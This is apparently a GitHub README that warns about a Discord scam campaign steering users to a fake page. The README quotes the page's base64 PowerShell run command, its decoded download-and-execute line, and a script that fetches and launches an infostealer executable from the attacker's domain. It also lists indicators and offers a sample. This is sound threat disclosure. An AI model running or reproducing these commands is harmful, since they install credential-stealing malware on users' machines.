# Scam Campaign - NalandaExporter

## Overview
This repository documents an ongoing scam campaign that is being spread across multiple Discord channels. The scam attempts to trick users into executing malicious PowerShell commands, ultimately leading to the installation of a credential-stealing malware.

---

## Scam Execution Process

### 1. Initial Redirect
The scam starts with a shortcut link that redirects users to the following website:

**[https://nalandareporter.com/wp-protect/](https://nalandareporter.com/wp-protect/)**

![Screenshot](https://github.com/user-attachments/assets/106ab0ac-1702-4be7-b3e3-f46228b1d11c)

### 2. PowerShell Execution Request
The site prompts users to execute the following PowerShell command via the Windows "Run" window:

```powershell
powershell -w h -e aQBlAHgAKABpAHcAcgAgAC0AVQByAGkAIAAnAGgAdAB0AHAAcwA6AC8ALwBuAGEAbABhAG4AZABhAHIAZQBwAG8AcgB0AGUAcgAuAGMAbwBtAC8AdwBwAC0AcAByAG8AdABlAGMAdAAvAGEAYwB0AGkAbwBuAC4AdAB4AHQAJwAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQA=
```

This is a Base64-encoded PowerShell command. Decoding it reveals the following malicious script:

```powershell
iex(iwr -Uri 'https://nalandareporter.com/wp-protect/action.txt' -UseBasicParsing)
```

### 3. Malware Download & Execution
The above command fetches and executes another PowerShell script hosted at:

```powershell
https://nalandareporter.com/wp-protect/path.txt
```

This script downloads and executes an `.exe` file using the following command:

```powershell
$path='C:\ProgramData\captcha.exe';
Invoke-RestMethod -Uri 'https://nalandareporter.com/wp-protect/keynote.exe' -OutFile $path;
Start-Process $path;
```

---

## Malware Analysis
An analysis of the downloaded executable using **Any.Run** confirms that it is a typical information-stealer malware.

**Analysis Report:** [Any.Run Task](https://app.any.run/tasks/f07e6cc7-ea85-4a68-9dd6-99fc3b58e7ff)

### Indicators of Compromise (IOCs)
- **IP Address:** `172.67.223.54`
- **C2 Domain:** `bzondingmoments.tech`

---

## Downloadable Malware Sample
For those interested in analyzing the executable, it has been uploaded in a **ZIP archive** with the password:

```
infected
```

**⚠ WARNING: Handling this file poses a risk. Do not execute it on an unprotected system. Use a sandboxed environment.**

---

## Conclusion
This scam campaign relies on social engineering tactics to trick users into executing malicious PowerShell scripts, ultimately leading to credential theft. Stay vigilant, avoid running unknown scripts, and report suspicious activity.

### Stay Safe! 🚨

